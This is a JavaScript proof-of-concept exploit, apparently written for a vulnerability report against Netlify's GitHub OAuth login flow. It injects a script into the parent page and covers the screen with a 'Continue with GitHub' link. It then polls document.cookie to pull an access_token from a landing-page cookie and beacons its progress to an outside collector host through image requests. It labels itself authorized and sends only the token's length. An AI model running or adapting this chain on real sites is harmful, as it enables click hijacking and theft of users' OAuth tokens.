(() => {
  const d = parent.document;

  // Install everything in the parent realm so it survives removal
  // of the iframe-like execution context.
  const script = d.createElement("script");

  script.textContent = String.raw`
    (() => {
      const COLLECTOR =
        "https://http-log-collector.netlify.app/api/log";

      function log(step, detail = "") {
        try {
          const u = new URL(COLLECTOR);
          u.searchParams.set("s", step);

          if (detail) {
            u.searchParams.set(
              "d",
              String(detail).slice(0, 200)
            );
          }

          u.searchParams.set("_", Date.now() + Math.random());

          new Image().src = u.toString();
        } catch {}
      }

      // Remove previous PoC instances.
      document.getElementById("oauth-chain-poc")?.remove();
      window.__oauthChainMonitor?.stop?.();

      const a = document.createElement("a");

      a.id = "oauth-chain-poc";
      a.href =
        "https://api.netlify.com/auth" +
        "?provider=github" +
        "&site_id=app.netlify.com" +
        "&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09" +
        "&login=true" +
        "&entry_point=direct" +
        "&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f" +
        "&device_fingerprint=bbbac72e6221cf088819fff54ca43b40" +
        "&redirect=" +
        encodeURIComponent("https://www.netlify.com/") +
        "&use_redirect=true";

      a.target = "_blank";
      a.rel = "noopener noreferrer";
      a.textContent = "Continue with GitHub";

      a.style.cssText = [
        "position:fixed",
        "inset:0",
        "width:100vw",
        "height:100vh",
        "background:#fff",
        "color:#000",
        "font-size:48px",
        "display:flex",
        "align-items:center",
        "justify-content:center",
        "z-index:2147483647",
        "text-decoration:none",
        "cursor:pointer"
      ].join(";");

      document.body.appendChild(a);
      log("link-appended");

      let stopped = false;
      let attempts = 0;
      let timeoutId;

      function stop() {
        stopped = true;
        clearTimeout(timeoutId);
      }

      window.__oauthChainMonitor = { stop };

      function inspect() {
        if (stopped) return;

        attempts++;

        try {
          const match = document.cookie.match(
            /(?:^|;\s*)_initial_landing_page=([^;]*)/
          );

          if (!match) {
            if (attempts <= 5 || attempts % 10 === 0) {
              log("waiting-for-cookie", "attempt=" + attempts);
            }
          } else {
            let landingPage = match[1];

            try {
              landingPage = decodeURIComponent(landingPage);
            } catch {}

            const tokenMatch = landingPage.match(
              /(?:^|[?#&])access_token=([^&#]+)/
            );

            if (tokenMatch) {
              stopped = true;

              // Report only proof and non-secret metadata.
              log(
                "chain-confirmed",
                "cookieReadable=true," +
                "tokenReadable=true," +
                "tokenLength=" + tokenMatch[1].length
              );

              console.warn(
                "[Authorized PoC] OAuth token is readable.",
                "The value was intentionally not transmitted."
              );

              return;
            }

            log(
              "cookie-readable",
              "tokenPresent=false,attempt=" + attempts
            );
          }
        } catch (error) {
          log("inspection-error", error?.message || error);
        }

        if (attempts >= 120) {
          log("chain-timeout");
          return;
        }

        timeoutId = setTimeout(inspect, 1000);
      }

      addEventListener("pagehide", () => log("parent-pagehide"));
      addEventListener(
        "visibilitychange",
        () => log("visibility", document.visibilityState)
      );

      log("parent-chain-installed");
      inspect();
    })();
  `;

  (d.head || d.documentElement).appendChild(script);
  script.remove();
})();
